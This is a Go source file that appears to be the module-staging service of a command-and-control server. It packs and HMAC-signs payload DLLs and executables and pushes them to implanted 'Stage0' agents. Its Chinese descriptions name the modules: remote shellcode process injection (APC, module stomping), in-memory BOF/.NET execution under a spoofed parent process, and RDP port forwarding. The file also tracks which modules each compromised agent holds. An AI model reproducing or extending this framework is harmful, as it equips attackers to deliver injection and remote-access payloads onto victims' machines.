package services

import (
	"crypto/sha256"
	"encoding/base64"
	"encoding/binary"
	"errors"
	"fmt"
	"log"
	"os"
	"path/filepath"
	"strings"
	"sync"

	"github.com/google/uuid"

	"cupcake-server/pkg/paths"
	"cupcake-server/pkg/utils"
)

// Product L2 modules (independent packages, separate push).
var productModuleIDs = map[string]bool{
	"desktop":  true,
	"iso_host": true,
	"inject":   true,
}

var (
	// ErrModuleForbidden: non-product id
	ErrModuleForbidden = errors.New("module forbidden")
	// ErrModuleNotFound: product id but not registered on disk/memory
	ErrModuleNotFound = errors.New("module not found")
)

// IsProductModule reports whether id is one of the three product L2 modules.
func IsProductModule(id string) bool {
	return productModuleIDs[sanitizeID(id)]
}

// NewModuleServiceForTest builds an isolated service (TempDir) — not the process singleton.
func NewModuleServiceForTest(dir string) *ModuleService {
	_ = os.MkdirAll(dir, 0o755)
	return &ModuleService{
		raw:         make(map[string][]byte),
		dir:         dir,
		agentLoaded: make(map[string]map[string]bool),
	}
}

// Module package format (must match Client/core/src/module_package.rs + wire_ids)
// MAGIC | ver(u16le) | flags(u16le) | id_len(u16le) | id | pay_len(u32le) | payload | hmac32

const (
	ckmsVersion = uint16(1)
)

// ModuleCatalogEntry is UI-facing metadata for a registered module.
type ModuleCatalogEntry struct {
	ID          string `json:"id"`
	Name        string `json:"name"`
	Description string `json:"description"`
	Kind        string `json:"kind"` // host | runtime | legacy | custom
	// LoadMode: product load path — mem (Manual-Map) | iso (iso_host) | legacy (LoadLibrary)
	LoadMode string `json:"load_mode"`
	Size     int    `json:"size"`
	// LoadedOnAgent: when listing with ?uuid=, whether agent currently holds this module
	LoadedOnAgent bool `json:"loaded_on_agent,omitempty"`
}

// ModuleService packs/serves L2 modules for Stage0 agents.
type ModuleService struct {
	mu sync.RWMutex
	// moduleID -> raw PE/DLL bytes (unpacked payload)
	raw map[string][]byte
	// modules directory on disk
	dir string
	// optional shared key material; empty → default dev key
	keySeed []byte
	// agentUUID -> set of module ids believed loaded/staged on agent
	agentLoaded map[string]map[string]bool
}

var defaultModuleService *ModuleService
var moduleOnce sync.Once

// GetModuleService returns the process-wide module service.
func GetModuleService() *ModuleService {
	moduleOnce.Do(func() {
		dir := paths.Join("modules")
		_ = os.MkdirAll(dir, 0o755)
		defaultModuleService = &ModuleService{
			raw:         make(map[string][]byte),
			dir:         dir,
			agentLoaded: make(map[string]map[string]bool),
		}
		defaultModuleService.scanDisk()
	})
	return defaultModuleService
}

// DefaultModuleKey matches Rust default_module_key() for dev/unpatched agents (exactly 32 bytes).
func DefaultModuleKey() []byte {
	seed := []byte("DEV_ONLY_MODULE_KEY_V1_DO_NOT___") // 32 bytes
	k := make([]byte, 32)
	copy(k, seed)
	return k
}

// DeriveModuleKey matches Rust derive_module_key(aes_key) — domain from wire seed.
func DeriveModuleKey(aesKey []byte) []byte {
	h := sha256.New()
	h.Write(utils.GetWireIDs().ModKeyDomain)
	h.Write(aesKey)
	return h.Sum(nil)
}

// SetKeySeed sets optional AES-derived seed for packaging.
func (m *ModuleService) SetKeySeed(aesKey []byte) {
	m.mu.Lock()
	defer m.mu.Unlock()
	if len(aesKey) == 0 {
		m.keySeed = nil
		return
	}
	m.keySeed = DeriveModuleKey(aesKey)
}

func (m *ModuleService) activeKey() []byte {
	if len(m.keySeed) >= 16 {
		return m.keySeed
	}
	return DefaultModuleKey()
}

// RegisterRaw stores raw module PE on disk first, then memory (atomic-ish).
// Product whitelist: desktop | iso_host | inject only.
// Non-goal: no "policy lock" — any admin may delete any product module.
func (m *ModuleService) RegisterRaw(id string, pe []byte) error {
	id = sanitizeID(id)
	if id == "" || len(pe) == 0 {
		return fmt.Errorf("invalid module id or empty payload")
	}
	if !IsProductModule(id) {
		return fmt.Errorf("%w: %s (product: desktop, iso_host, inject)", ErrModuleForbidden, id)
	}
	_ = os.MkdirAll(m.dir, 0o755)
	final := filepath.Join(m.dir, id+".bin")
	tmp := filepath.Join(m.dir, fmt.Sprintf(".%s.%s.tmp", id, uuid.NewString()))
	if err := os.WriteFile(tmp, pe, 0o644); err != nil {
		return fmt.Errorf("write module temp: %w", err)
	}
	if err := os.Rename(tmp, final); err != nil {
		_ = os.Remove(tmp)
		return fmt.Errorf("commit module file: %w", err)
	}
	cp := make([]byte, len(pe))
	copy(cp, pe)
	m.mu.Lock()
	m.raw[id] = cp
	m.mu.Unlock()
	return nil
}

// LoadFromFile loads a PE/DLL into the registry under id.
func (m *ModuleService) LoadFromFile(id, path string) error {
	b, err := os.ReadFile(path)
	if err != nil {
		return err
	}
	return m.RegisterRaw(id, b)
}

// Dir returns the modules storage directory.
func (m *ModuleService) Dir() string {
	return m.dir
}

// Delete removes a module from memory and disk.
// Returns ErrModuleForbidden / ErrModuleNotFound for controller mapping.
// Non-goal: no policy-lock state — admins may always delete product modules when present.
func (m *ModuleService) Delete(id string) error {
	id = sanitizeID(id)
	if id == "" {
		return fmt.Errorf("empty module id")
	}
	if !IsProductModule(id) {
		return fmt.Errorf("%w: %s", ErrModuleForbidden, id)
	}
	path := filepath.Join(m.dir, id+".bin")
	m.mu.Lock()
	_, inMem := m.raw[id]
	m.mu.Unlock()
	_, diskErr := os.Stat(path)
	onDisk := diskErr == nil
	if !inMem && !onDisk {
		// Also check alternate names as "present"
		alts := altNames(m.dir, id)
		for _, a := range alts {
			if _, e := os.Stat(a); e == nil {
				onDisk = true
				break
			}
		}
	}
	if !inMem && !onDisk {
		return fmt.Errorf("%w: %s", ErrModuleNotFound, id)
	}

	m.mu.Lock()
	delete(m.raw, id)
	for agent, set := range m.agentLoaded {
		if set != nil {
			delete(set, id)
			if len(set) == 0 {
				delete(m.agentLoaded, agent)
			}
		}
	}
	m.mu.Unlock()

	if err := os.Remove(path); err != nil && !os.IsNotExist(err) {
		return err
	}
	for _, alt := range altNames(m.dir, id) {
		_ = os.Remove(alt)
	}
	log.Printf("[Module] deleted %s", id)
	return nil
}

func altNames(dir, id string) []string {
	alts := []string{filepath.Join(dir, "cupcake_mod_"+id+".dll")}
	if id == "iso_host" {
		alts = append(alts,
			filepath.Join(dir, "cupcake-iso-host.exe"),
			filepath.Join(dir, "iso_host.exe"),
		)
	}
	return alts
}

// resolveRaw returns registered PE bytes for module id (memory then disk).
// Always enforces product whitelist — legacy bof.bin on disk cannot be packed.
func (m *ModuleService) resolveRaw(id string) ([]byte, error) {
	id = sanitizeID(id)
	if !IsProductModule(id) {
		return nil, fmt.Errorf("%w: %s", ErrModuleForbidden, id)
	}
	m.mu.RLock()
	pe, ok := m.raw[id]
	m.mu.RUnlock()
	if ok && len(pe) > 0 {
		return pe, nil
	}
	path := filepath.Join(m.dir, id+".bin")
	b, err := os.ReadFile(path)
	if err != nil {
		return nil, fmt.Errorf("%w: %s", ErrModuleNotFound, id)
	}
	m.mu.Lock()
	m.raw[id] = b
	m.mu.Unlock()
	return b, nil
}

// PackCKMS builds a signed CKMS blob for module id using the service key seed
// (dev/default path). Prefer PackCKMSWithKey for agent pushes.
func (m *ModuleService) PackCKMS(id string) ([]byte, error) {
	pe, err := m.resolveRaw(id)
	if err != nil {
		return nil, err
	}
	return PackModule(id, pe, m.activeKey())
}

// PackCKMSWithKey packs with an explicit 32-byte module HMAC key (already
// derive_module_key(aes) material). Avoids global SetKeySeed races across agents.
func (m *ModuleService) PackCKMSWithKey(id string, moduleHMACKey []byte) ([]byte, error) {
	if len(moduleHMACKey) < 16 {
		return nil, fmt.Errorf("module HMAC key too short")
	}
	pe, err := m.resolveRaw(id)
	if err != nil {
		return nil, err
	}
	return PackModule(id, pe, moduleHMACKey)
}

// CKMS flags (u16 LE) — keep in sync with Client module_package FLAG_*.
const (
	CKMSFlagPrefMemMap    uint16 = 1 << 0 // prefer Manual-Map on agent
	CKMSFlagRequireMemMap uint16 = 1 << 1 // refuse LoadLibrary disk fallback
)

// PackModule is the pure CKMS packer (exported for tests). Flags default 0.
func PackModule(id string, payload, key []byte) ([]byte, error) {
	return PackModuleWithFlags(id, payload, key, 0)
}

// PackModuleWithFlags packs MAGIC|ver|flags|id|payload|hmac (see Client module_package).
func PackModuleWithFlags(id string, payload, key []byte, flags uint16) ([]byte, error) {
	if id == "" || len(id) > 64 {
		return nil, fmt.Errorf("invalid module id length")
	}
	if len(key) < 16 {
		return nil, fmt.Errorf("module key too short")
	}
	idBytes := []byte(id)
	body := make([]byte, 0, 4+2+2+2+len(idBytes)+4+len(payload)+32)
	pkg := utils.GetWireIDs().PkgMagic
	body = append(body, pkg[:]...)
	ver := make([]byte, 2)
	binary.LittleEndian.PutUint16(ver, ckmsVersion)
	body = append(body, ver...)
	fl := make([]byte, 2)
	binary.LittleEndian.PutUint16(fl, flags)
	body = append(body, fl...)
	idLen := make([]byte, 2)
	binary.LittleEndian.PutUint16(idLen, uint16(len(idBytes)))
	body = append(body, idLen...)
	body = append(body, idBytes...)
	payLen := make([]byte, 4)
	binary.LittleEndian.PutUint32(payLen, uint32(len(payload)))
	body = append(body, payLen...)
	body = append(body, payload...)
	mac := hmacSHA256(key, body)
	body = append(body, mac...)
	return body, nil
}

// PackBase64 returns base64 CKMS for agent module_stage command.
func (m *ModuleService) PackBase64(id string) (string, error) {
	blob, err := m.PackCKMS(id)
	if err != nil {
		return "", err
	}
	return base64.StdEncoding.EncodeToString(blob), nil
}

// PackBase64WithKey is PackBase64 with an explicit module HMAC key.
func (m *ModuleService) PackBase64WithKey(id string, moduleHMACKey []byte) (string, error) {
	blob, err := m.PackCKMSWithKey(id, moduleHMACKey)
	if err != nil {
		return "", err
	}
	return base64.StdEncoding.EncodeToString(blob), nil
}

// List returns registered module ids.
func (m *ModuleService) List() []string {
	entries := m.ListCatalog("")
	out := make([]string, 0, len(entries))
	for _, e := range entries {
		out = append(out, e.ID)
	}
	return out
}

// ModuleDescribe returns human name/description/kind for known module ids.
func ModuleDescribe(id string) (name, desc, kind string) {
	name, desc, kind, _ = ModuleDescribeEx(id)
	return name, desc, kind
}

// ModuleDescribeEx also returns product load_mode: mem | iso | legacy.
func ModuleDescribeEx(id string) (name, desc, kind, loadMode string) {
	switch sanitizeID(id) {
	case "iso_host":
		return "隔离执行宿主",
			"产品模块③：PPID 伪装短命进程内内存执行 BOF/.NET。载荷在插件库，本模块是宿主。",
			"host", "iso"
	case "inject":
		return "进程注入",
			"产品模块②：L2 远程 shellcode 注入（method: nt|crt|apc|stomping|auto）。与 desktop/iso_host 独立推送。",
			"runtime", "mem"
	case "desktop":
		return "远程桌面",
			"产品模块①：RDP 3389 端口转发。加载后在「远程桌面」页启动转发；Yamux DESKTOP(0x0D)。",
			"runtime", "mem"
	default:
		return id, "非产品模块（已忽略；产品仅 desktop / iso_host / inject）。", "legacy", "mem"
	}
}

// ListCatalog returns modules with descriptions; if agentUUID set, fills LoadedOnAgent.
func (m *ModuleService) ListCatalog(agentUUID string) []ModuleCatalogEntry {
	m.mu.RLock()
	defer m.mu.RUnlock()
	seen := make(map[string]bool)
	var out []ModuleCatalogEntry
	add := func(id string, size int) {
		id = sanitizeID(id)
		if id == "" || seen[id] || !IsProductModule(id) {
			return
		}
		seen[id] = true
		name, desc, kind, loadMode := ModuleDescribeEx(id)
		e := ModuleCatalogEntry{
			ID:          id,
			Name:        name,
			Description: desc,
			Kind:        kind,
			LoadMode:    loadMode,
			Size:        size,
		}
		if agentUUID != "" {
			if set := m.agentLoaded[agentUUID]; set != nil && set[id] {
				e.LoadedOnAgent = true
			}
		}
		out = append(out, e)
	}
	for id, pe := range m.raw {
		add(id, len(pe))
	}
	entries, _ := os.ReadDir(m.dir)
	for _, ent := range entries {
		if ent.IsDir() {
			continue
		}
		name := ent.Name()
		if strings.HasSuffix(name, ".bin") {
			id := strings.TrimSuffix(name, ".bin")
			sz := 0
			if info, err := ent.Info(); err == nil {
				sz = int(info.Size())
			}
			if pe, ok := m.raw[id]; ok {
				sz = len(pe)
			}
			add(id, sz)
		}
	}
	return out
}

// MarkAgentModule records that module id is staged/loaded on agent.
func (m *ModuleService) MarkAgentModule(agentUUID, moduleID string) {
	if agentUUID == "" || moduleID == "" {
		return
	}
	m.mu.Lock()
	defer m.mu.Unlock()
	if m.agentLoaded == nil {
		m.agentLoaded = make(map[string]map[string]bool)
	}
	if m.agentLoaded[agentUUID] == nil {
		m.agentLoaded[agentUUID] = make(map[string]bool)
	}
	m.agentLoaded[agentUUID][sanitizeID(moduleID)] = true
}

// ClearAgentModule records unload / burn.
func (m *ModuleService) ClearAgentModule(agentUUID, moduleID string) {
	if agentUUID == "" {
		return
	}
	m.mu.Lock()
	defer m.mu.Unlock()
	if set := m.agentLoaded[agentUUID]; set != nil {
		delete(set, sanitizeID(moduleID))
	}
}

// AgentHasModule reports whether we believe module is still on agent.
func (m *ModuleService) AgentHasModule(agentUUID, moduleID string) bool {
	m.mu.RLock()
	defer m.mu.RUnlock()
	set := m.agentLoaded[agentUUID]
	return set != nil && set[sanitizeID(moduleID)]
}

// SetAgentModules replaces loaded set from agent module_list (comma-separated).
func (m *ModuleService) SetAgentModules(agentUUID, listCSV string) {
	m.mu.Lock()
	defer m.mu.Unlock()
	if m.agentLoaded == nil {
		m.agentLoaded = make(map[string]map[string]bool)
	}
	set := make(map[string]bool)
	for _, p := range strings.Split(listCSV, ",") {
		p = strings.TrimSpace(p)
		if p != "" {
			set[sanitizeID(p)] = true
		}
	}
	m.agentLoaded[agentUUID] = set
}

// BuildModuleStageCommand builds a CommandPayload-compatible map for pushing a module.
func (m *ModuleService) BuildModuleStageCommand(id, reqID string) (map[string]interface{}, error) {
	b64, err := m.PackBase64(id)
	if err != nil {
		return nil, err
	}
	return map[string]interface{}{
		"command_type":    "module_stage",
		"command_content": id,
		"path":            id,
		"data":            b64,
		"req_id":          reqID,
	}, nil
}

func (m *ModuleService) scanDisk() {
	entries, err := os.ReadDir(m.dir)
	if err != nil {
		return
	}
	for _, e := range entries {
		if e.IsDir() || !strings.HasSuffix(e.Name(), ".bin") {
			continue
		}
		id := sanitizeID(strings.TrimSuffix(e.Name(), ".bin"))
		if !IsProductModule(id) {
			log.Printf("[Module] skip non-product blob on disk: %s (not in whitelist)", e.Name())
			continue
		}
		b, err := os.ReadFile(filepath.Join(m.dir, e.Name()))
		if err != nil {
			continue
		}
		m.raw[id] = b
	}
	// Well-known product module filenames
	for _, pair := range []struct{ id, name string }{
		{"iso_host", "cupcake-iso-host.exe"},
		{"iso_host", "iso_host.exe"},
		{"desktop", "cupcake_mod_desktop.dll"},
		{"inject", "cupcake_mod_inject.dll"},
	} {
		if !IsProductModule(pair.id) {
			continue
		}
		if _, ok := m.raw[pair.id]; ok {
			continue
		}
		p := filepath.Join(m.dir, pair.name)
		if b, err := os.ReadFile(p); err == nil && len(b) > 0 {
			m.raw[pair.id] = b
		}
	}
	// Drop non-product ids left on disk from older builds (do not delete files here)
	for id := range m.raw {
		if !IsProductModule(id) {
			delete(m.raw, id)
		}
	}
}

// TryLoadDefaultRuntime ensures module id is registered from storage/modules/{id}.bin
func (m *ModuleService) TryLoadDefaultRuntime(id string) error {
	id = sanitizeID(id)
	m.mu.RLock()
	_, ok := m.raw[id]
	m.mu.RUnlock()
	if ok {
		return nil
	}
	candidates := []string{
		filepath.Join(m.dir, id+".bin"),
		filepath.Join(m.dir, "cupcake-iso-host.exe"),
		filepath.Join(m.dir, "iso_host.exe"),
		filepath.Join(m.dir, "cupcake_mod_"+id+".dll"),
		filepath.Join(m.dir, "cupcake_mod_"+id+".so"),
	}
	for _, p := range candidates {
		if err := m.LoadFromFile(id, p); err == nil {
			return nil
		}
	}
	return fmt.Errorf("runtime module %q not in storage/modules (build cupcake-mod-%s and copy as %s.bin)", id, id, id)
}

func sanitizeID(id string) string {
	id = filepath.Base(id)
	id = strings.ReplaceAll(id, "..", "")
	return id
}

// hmacSHA256 RFC2104 (matches Rust module_package::hmac_sha256)
func hmacSHA256(key, data []byte) []byte {
	var k [64]byte
	if len(key) > 64 {
		sum := sha256.Sum256(key)
		copy(k[:], sum[:])
	} else {
		copy(k[:], key)
	}
	var ipad, opad [64]byte
	for i := 0; i < 64; i++ {
		ipad[i] = 0x36 ^ k[i]
		opad[i] = 0x5c ^ k[i]
	}
	inner := sha256.New()
	inner.Write(ipad[:])
	inner.Write(data)
	innerSum := inner.Sum(nil)
	outer := sha256.New()
	outer.Write(opad[:])
	outer.Write(innerSum)
	return outer.Sum(nil)
}
